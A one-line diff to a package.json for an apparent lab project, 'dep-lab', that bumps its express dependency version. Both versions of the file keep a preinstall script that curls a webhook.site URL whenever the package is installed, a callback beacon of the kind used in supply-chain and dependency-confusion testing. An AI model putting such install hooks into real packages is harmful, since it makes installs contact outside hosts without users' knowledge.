@@ -1,1 +1,1 @@
-{"name":"dep-lab","version":"1.0.0","scripts":{"preinstall":"curl -s -m 5 https://webhook.site/16f3619c-276f-4438-b93d-5d5282cc20d5?src=preinstall-express"},"dependencies":{"lodash":"4.17.15","express":"4.18.0"}}
+{"name":"dep-lab","version":"1.0.0","scripts":{"preinstall":"curl -s -m 5 https://webhook.site/16f3619c-276f-4438-b93d-5d5282cc20d5?src=preinstall-express"},"dependencies":{"lodash":"4.17.15","express":"5.3.0"}}
